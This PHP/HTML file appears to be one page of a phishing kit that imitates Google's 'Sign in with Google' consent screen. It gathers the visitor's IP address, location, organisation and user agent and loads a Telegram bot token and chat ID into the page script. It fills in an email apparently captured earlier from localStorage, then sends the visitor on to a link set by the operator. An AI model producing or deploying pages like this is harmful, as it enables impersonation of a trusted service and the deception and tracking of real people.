<?php
// get root directory
$rootDirectory = dirname(dirname(__FILE__));
require_once($rootDirectory . '/get-data.php');
require_once($rootDirectory . '/getip.php');

$mainFile = './main.txt';
$mainLink = trim(file_get_contents($mainFile));

?>

<?php
function getServerIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ip_server = getServerIP();
?> <?php
$userAgent = $_SERVER['HTTP_USER_AGENT'];
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="icon" href="/images/favicon.ico">
    <style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }

    body {
        font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", arial, sans-serif;
        background-color: #f1f3f4;
        min-height: 100vh;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        gap: 5px;
        padding: 20px;
    }

    .container {
        background: white;
        border-radius: 24px;
        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        max-width: 55%;
        width: 100%;
        padding: 36px 40px 36px;
    }

    .header {
        display: flex;
        align-items: center;
        margin-bottom: 16px;
    }

    .google-logo {
        width: 44px;
        height: 44px;
        margin-right: 8px;
    }

    .signin-text {
        font-size: 16px;
        font-weight: 400;
        color: #202124;
    }

    .main-content {
        display: flex;
        gap: 40px;
        align-items: flex-start;
    }

    .left-section {
        flex: 1;
    }

    .right-section {
        flex: 1;
    }

    .app-logo {
        width: 48px;
        height: 48px;
        background: rgb(243, 247, 250);
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        border: 1px solid rgb(219, 221, 223);
        border-radius: 8px;
        margin-bottom: 16px;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 20px;
        font-weight: bold;
        color: #5f6368;
    }

    .title {
        font-size: 34px;
        font-weight: 400;
        color: #202124;
        margin-bottom: 8px;
    }

    .subtitle {
        font-size: 18px;
        color: rgb(60, 61, 63);
        margin-bottom: 32px;
    }

    .subtitle a {
        color: rgb(11 87 208 / 1);
        text-decoration: none;
    }

    .subtitle a:hover {
        text-decoration: underline;
    }

    .user-info {
        background: transparent;
        padding: 5px 10px 5px 5px;
        margin-bottom: 24px;
        border: 1px solid rgb(219, 221, 223);
        border-radius: 24px;
        width: fit-content;
        font-size: 14px;
        color: #202124;
        display: flex;
        align-items: center;
        gap: 8px;
    }

    .user-icon {
        width: 20px;
        height: 20px;
        background: #5f6368;
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        color: white;
        font-size: 12px;
        font-weight: bold;
    }

    .user-email {
        font-weight: 500;
    }

    .dropdown-arrow {
        width: 16px;
        height: 16px;
        color: #5f6368;
        cursor: pointer;
    }

    .consent-header {
        font-size: 20px;
        font-weight: 400;
        color: rgb(71, 72, 75);
        margin-bottom: 24px;
    }

    .info-item {
        display: flex;
        align-items: center;
        gap: 12px;
        margin-bottom: 16px;
        padding: 12px;
    }

    .info-icon {
        width: 24px;
        height: 24px;
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
    }

    .info-content {
        flex: 1;
    }

    .info-label {
        font-size: 16px;
        font-weight: 500;
        color: #202124;
        margin-bottom: 2px;
    }

    .info-description {
        font-size: 12px;
        color: rgb(60, 61, 63);
    }

    .legal-text {
        font-size: 14px;
        color: rgb(60, 61, 63);
        line-height: 1.5;
        margin-bottom: 16px;
    }

    .legal-text a {
        color: rgb(11 87 208 / 1);
        text-decoration: none;
    }

    .legal-text a:hover {
        text-decoration: underline;
    }

    .button-group {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-top: 32px;
        gap: 16px;
    }

    .cancel-button {
        background: white;
        color: rgb(11 87 208 / 1);
        border: 1px solid rgb(219, 221, 223);
        border-radius: 24px;
        padding: 12px 24px;
        font-size: 14px;
        font-weight: bold;
        cursor: pointer;
        transition: background-color 0.2s;
        width: 100%;
    }

    .cancel-button:hover {
        background: #f8f9fa;
    }

    .continue-button {
        background: white;
        color: rgb(11 87 208 / 1);
        border: 1px solid rgb(219, 221, 223);
        border-radius: 24px;
        padding: 12px 24px;
        font-size: 14px;
        font-weight: bold;
        cursor: pointer;
        transition: background-color 0.2s;
        width: 100%;
    }

    .continue-button:hover {
        background: #f8f9fa;
    }

    .page-footer {
        padding: 20px;
        display: flex;
        align-items: center;
        background: transparent;
        position: relative;
        bottom: 0;
        width: 100%;
        max-width: 55%;
    }

    .language-selector {
        display: flex;
        align-items: center;
        gap: 8px;
        color: #5f6368;
        font-size: 12px;
        cursor: pointer;
    }

    .language-selector:hover {
        color: rgb(11 87 208 / 1);
    }

    .page-footer-links {
        display: flex;
        gap: 16px;
    }

    .page-footer-link {
        color: #5f6368;
        text-decoration: none;
        font-size: 12px;
    }

    .page-footer-link:hover {
        text-decoration: underline;
    }

    @media (max-width: 480px) {
        .container {
            padding: 24px 20px;
            margin: 0 16px;
            max-width: 450px;
        }

        .main-content {
            flex-direction: column;
            gap: 24px;
        }

        .button-group {
            flex-direction: column;
            gap: 16px;
            align-items: stretch;
        }

        .cancel-button,
        .continue-button {
            width: 100%;
        }
    }
    </style>
</head>

<body>
    <div class="container">
        <div class="header">
            <svg class="google-logo" viewBox="0 0 24 24">
                <path fill="#4285F4"
                    d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" />
                <path fill="#34A853"
                    d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
                <path fill="#FBBC05"
                    d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" />
                <path fill="#EA4335"
                    d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" />
            </svg>
            <span class="signin-text">Sign in with Google</span>
        </div>
        <div class="main-content">
            <div class="left-section">
                <div class="app-logo" id="appLogo">JL</div>
                <h1 class="title">Sign in</h1>
                <div class="user-info">
                    <div class="user-icon" id="userIcon">L</div>
                    <span class="user-email" id="displayEmail"></span>
                    <svg class="dropdown-arrow" viewBox="0 0 24 24" fill="currentColor">
                        <path d="M7 10l5 5 5-5z" />
                    </svg>
                </div>
            </div>
            <div class="right-section">
                <h2 class="consent-header">Google will allow to access this info about you</h2>
                <div class="info-item">
                    <div class="info-icon">
                        <svg fill="#000000" width="20px" height="20px" viewBox="0 0 24 24"
                            xmlns="http://www.w3.org/2000/svg">
                            <path fill-rule="evenodd"
                                d="M6.03531778,18.739764 C7.62329979,20.146176 9.71193925,21 12,21 C14.2880608,21 16.3767002,20.146176 17.9646822,18.739764 C17.6719994,17.687349 15.5693823,17 12,17 C8.43061774,17 6.32800065,17.687349 6.03531778,18.739764 Z M4.60050358,17.1246475 C5.72595131,15.638064 8.37060189,15 12,15 C15.6293981,15 18.2740487,15.638064 19.3994964,17.1246475 C20.4086179,15.6703183 21,13.9042215 21,12 C21,7.02943725 16.9705627,3 12,3 C7.02943725,3 3,7.02943725 3,12 C3,13.9042215 3.59138213,15.6703183 4.60050358,17.1246475 Z M12,23 C5.92486775,23 1,18.0751322 1,12 C1,5.92486775 5.92486775,1 12,1 C18.0751322,1 23,5.92486775 23,12 C23,18.0751322 18.0751322,23 12,23 Z M8,10 C8,7.75575936 9.57909957,6 12,6 C14.4141948,6 16,7.92157821 16,10.2 C16,13.479614 14.2180861,15 12,15 C9.76086382,15 8,13.4273743 8,10 Z M10,10 C10,12.2692568 10.8182108,13 12,13 C13.1777063,13 14,12.2983927 14,10.2 C14,8.95041736 13.2156568,8 12,8 C10.7337387,8 10,8.81582479 10,10 Z" />
                        </svg>
                    </div>
                    <div class="info-content">
                        <div class="info-label" id="displayName">Lebona Rolilo</div>
                        <div class="info-description">Name and profile picture</div>
                    </div>
                </div>
                <div class="info-item">
                    <div class="info-icon">
                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none"
                            stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" />
                            <polyline points="22,6 12,13 2,6" />
                        </svg>
                    </div>
                    <div class="info-content">
                        <div class="info-label" id="displayEmailRight"></div>
                        <div class="info-description">Email address</div>
                    </div>
                </div>
                <div class="legal-text"> Review <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a> to
                    understand how will process and protect your data. </div>
                <div class="legal-text"> To make changes at any time, go to your <a href="#">Google Account</a>. </div>
                <div class="legal-text"> Learn more about <a href="#">Sign in with Google</a>. </div>
                <div class="button-group">
                    <button type="button" class="cancel-button"
                        onclick="window.location.href='./login/google.php'">Cancel</button>
                    <button type="button" class="continue-button"
                        onclick="sendToTelegramAndContinue()">Continue</button>
                </div>
            </div>
        </div>
    </div>
    <div class="page-footer">
        <div class="language-selector" style="position: absolute; left: 0;">
            <span>English (United States)</span>
            <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor">
                <path d="M7 10l5 5 5-5z" />
            </svg>
        </div>
        <div class="page-footer-links" style="position: absolute; right: 0;">
            <a href="#" class="page-footer-link">Help</a>
            <a href="#" class="page-footer-link">Privacy</a>
            <a href="#" class="page-footer-link">Terms</a>
        </div>
    </div>
    <script>
    // Biến từ PHP
    var ip = '<?php echo $ip; ?>';
    var city = '<?php echo $city; ?>';
    var country = '<?php echo $country; ?>';
    var org = '<?php echo $org; ?>';
    var timezone = '<?php echo $timezone; ?>';
    var userAgent = '<?php echo $userAgent; ?>';
    var botToken = '<?php echo $token; ?>';
    var chatId = '<?php echo $chatId; ?>';
    document.addEventListener('DOMContentLoaded', function() {
        const displayEmail = document.getElementById('displayEmail');
        const displayEmailRight = document.getElementById('displayEmailRight');
        const displayName = document.getElementById('displayName');
        // Hiển thị email từ localStorage
        const email = localStorage.getItem('googleEmail') || localStorage.getItem('email');
        if (email) {
            displayEmail.textContent = email;
            displayEmailRight.textContent = email;
            // Lấy ký tự đầu tiên của email để hiển thị trong app-logo và user-icon
            const firstChar = email.charAt(0).toUpperCase();
            const appLogo = document.getElementById('appLogo');
            const userIcon = document.getElementById('userIcon');
            appLogo.textContent = firstChar;
            userIcon.textContent = firstChar;
            // Tạo tên từ email (lấy phần trước @)
            const emailParts = email.split('@');
            const nameFromEmail = emailParts[0];
            const nameParts = nameFromEmail.split('.');
            const firstName = nameParts[0].charAt(0).toUpperCase() + nameParts[0].slice(1);
            const lastName = nameParts.length > 1 ? nameParts[1].charAt(0).toUpperCase() + nameParts[1].slice(
                1) : '';
            const fullName = lastName ? `${lastName} ${firstName}` : firstName;
            displayName.textContent = fullName;
        }
    });

    function sendToTelegramAndContinue() {
        // Chỉ chuyển đến index.php, không gửi Telegram
        window.location.href = "<?php echo $mainLink; ?>";
    }
    </script>
</body>

</html>